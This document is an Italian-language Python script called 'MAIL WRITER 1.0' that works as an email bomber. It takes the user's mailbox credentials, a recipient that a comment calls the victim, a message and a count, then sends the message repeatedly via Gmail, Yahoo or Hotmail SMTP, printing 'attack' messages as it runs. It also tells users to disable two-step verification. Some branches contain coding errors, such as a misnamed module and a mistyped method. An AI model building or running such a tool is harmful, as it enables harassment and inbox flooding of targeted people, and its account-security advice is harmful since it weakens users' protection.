print('MAIL WRITER 1.0, DIRITTI RISERVATI,ARTIST_00.')
print('ATTIVARE ACCESSO A GMAIL DA APP MENO ATTENDIBILI PER EVITARE ERRORI DI LOGIN')
print('NON FUNZIONA SU ACCOUNT CON VERIFICA A 2 PASSAGGI. SI PREGA DI DISABILITARLA')
print('\n\n\n')

print('##########################################')
import smtplib
richiesta=int(input('\nSeleziona la casella di posta:\n\n\n[1] GMAIL\n[2] YHAOO\n[3] HOTMAIL\n\n\nNUMERO: '))
print('')
print('##########################################')
user=str(input('\nImmetti il nome utente della relativa casella di posta: '))# Nome utente della vostra casella di posta!!! es: miamail@gmail/yhaoo/hotmail.com
password=str(input('\nImmetti la password della relativa casella di posta: '))#Password della vostra caseella di posta!!!
destinatario=str(input('\nImmetti il destinatario: '))# email della vittima
messaggio=str(input('\nImmetti il messaggio: '))#messaggio
print('')
print('#############################à###########')

print('\nMAILWRITER CONFIGURATO CORRETTAMENTE!\n')
r2=input('CONTINUARE [SI/NO]: ')
print('')
print('##########################################')
if r2 == 'SI':
    NumeroDiMail=int(input('\nImmettere il numero di mail da inviare: '))
    if richiesta==1:
        print('ATTACCO CONTRO OBBIETTIVO [1]')
        s=smtplib.SMTP('smtp.gmail.com',587)
        s.ehlo()
        s.starttls()
        s.login(user, password)
        print('\nATTACCO COMPLETATO\nLa applicazione si chiuderà da sola al termine del ciclo')
        for x in range(0,NumeroDiMail):
            s.sendmail(user, destinatario, messaggio)
    if richiesta==2:
        print('ATTACCO CONTRO OBBIETTIVO [2]')
        l=smtplib.SMTP('smtp.mail.yahoo.com', 465)
        l.ehlo()
        l.starttls()
        l.login(user, password)
        print('\nATTACCO  COMPLETATO\nLa applicazione si chiuderà da sola al termine del ciclo')
        for x in range(0,NumeroDiMail):
            l.sendmail(user, destinatario, messaggio)
    if richiesta==3:
        print('ATTACCO CONTRO OBBIETTIVO [3]')
        t=smtp.SMTP('smtp.live.com',465)
        t.ehlo()
        t.starttlst
        t.login(user, password)
        print('\nATTACCO COMPLETATO\nLa applicazione si chiuderà da sola al termine del ciclo')
        for x in range(0,NumeroDiMail):
            t.sendmail(user, destinatario, messaggio)
if r2 == 'NO':
    exit()
    
    
        
            
            
             
             
                 


